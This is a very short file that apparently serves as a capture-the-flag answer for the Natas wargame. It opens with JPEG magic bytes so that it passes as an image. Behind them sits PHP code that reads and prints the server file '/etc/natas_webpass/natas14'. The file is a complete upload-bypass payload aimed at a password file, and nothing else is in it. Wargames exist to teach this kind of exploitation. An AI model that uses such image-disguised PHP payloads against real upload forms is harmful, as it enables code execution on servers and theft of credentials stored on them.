ÿØÿ     
<?php
$fn = '/etc/natas_webpass/natas14';
$fp = fopen($fn, 'r');
echo '<br>'.fread($fp, filesize($fn));
?>